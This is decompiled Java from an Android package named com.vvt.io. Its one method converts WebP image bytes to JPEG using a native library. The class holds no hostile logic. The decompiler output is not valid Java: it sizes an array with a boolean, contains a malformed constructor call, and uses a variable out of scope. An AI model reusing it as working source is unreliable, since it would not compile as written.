package com.vvt.io;

import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.Bitmap.Config;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.IntBuffer;

public class s
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  static
  {
    System.loadLibrary("fxwebp");
  }
  
  public static byte[] a(byte[] paramArrayOfByte)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    byte[] arrayOfByte = null;
    try
    {
      boolean bool2 = a;
      if (bool2) {}
      bool2 = true;
      Object localObject1 = new int[bool2];
      int j = 0;
      Object localObject2 = null;
      int k = 0;
      Object localObject3 = null;
      localObject1[0] = 0;
      j = 1;
      localObject2 = new int[j];
      k = 0;
      localObject3 = null;
      int n = 0;
      int[] arrayOfInt = null;
      localObject2[0] = 0;
      k = paramArrayOfByte.length;
      long l = k;
      com.google.webp.a.a(paramArrayOfByte, l, (int[])localObject1, (int[])localObject2);
      boolean bool4 = a;
      if (bool4) {}
      int m = paramArrayOfByte.length;
      l = m;
      localObject3 = com.google.webp.a.b(paramArrayOfByte, l, (int[])localObject1, (int[])localObject2);
      n = localObject3.length;
      n /= 4;
      arrayOfInt = new int[n];
      localObject3 = ByteBuffer.wrap((byte[])localObject3);
      localObject3 = ((ByteBuffer)localObject3).asIntBuffer();
      ((IntBuffer)localObject3).get(arrayOfInt);
      m = 0;
      localObject3 = null;
      int i = localObject1[0];
      m = 0;
      localObject3 = null;
      j = localObject2[0];
      localObject3 = Bitmap.Config.RGB_565;
      localObject1 = Bitmap.createBitmap(arrayOfInt, i, j, (Bitmap.Config)localObject3);
      localObject2 = new java/io/ByteArrayOutputStream;
      ((ByteArrayOutputStream)localObject2).<init>();
      localObject3 = Bitmap.CompressFormat.JPEG;
      n = 100;
      ((Bitmap)localObject1).compress((Bitmap.CompressFormat)localObject3, n, (OutputStream)localObject2);
      arrayOfByte = ((ByteArrayOutputStream)localObject2).toByteArray();
      ((Bitmap)localObject1).recycle();
      d.a((OutputStream)localObject2);
      bool3 = a;
      if (!bool3) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
    bool3 = a;
    if (bool3) {}
    return arrayOfByte;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/io/s.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */